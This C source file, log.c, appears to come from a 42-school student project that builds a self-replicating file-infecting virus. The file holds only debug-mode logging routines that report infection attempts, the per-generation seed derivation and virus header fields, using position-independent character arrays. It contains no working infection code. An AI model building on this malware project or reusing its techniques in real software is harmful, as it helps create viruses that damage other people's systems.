/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   log.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/20 23:16:08 by anselme           #+#    #+#             */
/*   Updated: 2020/12/01 20:13:04 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifdef DEBUG

#include "loader.h"
#include "utils.h"
#include "position_independent.h"

void	log_try_infecting(const char *file)
{
	PD_ARRAY(char, trying,'\033','[','3','6','m','[','L','O','G',']',' ','t','r','y','i','n','g',' ','t','o',' ','i','n','f','e','c','t',':',' ','\033','[','0','m',0);

	putstr(trying);
	putstr(file);
	putchar('\n');
}

void	log_success(void)
{
	PD_ARRAY(char, success,'\033','[','3','2','m','[','L','O','G',']',' ','i','n','f','e','c','t','i','o','n',' ','s','u','c','c','e','e','d','e','d','\033','[','0','m','\n',0);

	putstr(success);
}

void	log_all_seeds(const uint64_t father_seed, const uint64_t hdr_hash, const uint64_t son_seed)
{
	PD_ARRAY(char, newline, '\n',0);
	PD_ARRAY(char, father,'[','L','O','G',']',' ','f','a','t','h','e','r','_','s','e','e','d',':',' ',0);
	PD_ARRAY(char, son,'[','L','O','G',']',' ','s','o','n','_','s','e','e','d',':',' ',' ',' ',' ',0);
	PD_ARRAY(char, uniquemethod,'[','L','O','G',']',' ','s','o','n','_','s','e','e','d',' ','=',' ','h','a','s','h','(','f','a','t','h','e','r','_','s','e','e','d',' ','^',' ','c','l','i','e','n','t','_','I','D',')','\n','[','L','O','G',']',' ','\033','[','3','5','m',0);
	PD_ARRAY(char, equal,'\033','[','0','m',' ','=',' ',0);
	PD_ARRAY(char, opxor,' ','^',' ',0);
	PD_ARRAY(char, rpar,')',0);
	PD_ARRAY(char, hashlpar,'h','a','s','h','(',0);

	putstr(father);
	putu64(father_seed);
	putstr(newline);
	putstr(son);
	putu64(son_seed);
	putstr(newline);
	putstr(uniquemethod);
	putu64(son_seed);
	putstr(equal);
	putstr(hashlpar);
	putu64(father_seed);
	putstr(opxor);
	putu64(hdr_hash);
	putstr(rpar);
	putstr(newline);
}

void	log_virus_header(struct virus_header *vhdr)
{
	PD_ARRAY(char, newline, '\n',0);
	PD_ARRAY(char, seed, '[','L','O','G',']',' ','s','e','e','d',':',' ',0);
	PD_ARRAY(char, virus_size, '[','L','O','G',']',' ','v','i','r','u','s','_','s','i','z','e',':',' ',0);
	PD_ARRAY(char, loader_entry, '[','L','O','G',']',' ','l','o','a','d','e','r','_','e','n','t','r','y',':',' ',0);

	putstr(seed); putu64(vhdr->seed); putstr(newline);
	putstr(virus_size); putu64(vhdr->virus_size); putstr(newline);
	putstr(loader_entry); putu64((size_t)vhdr->loader_entry); putstr(newline);
}

#endif
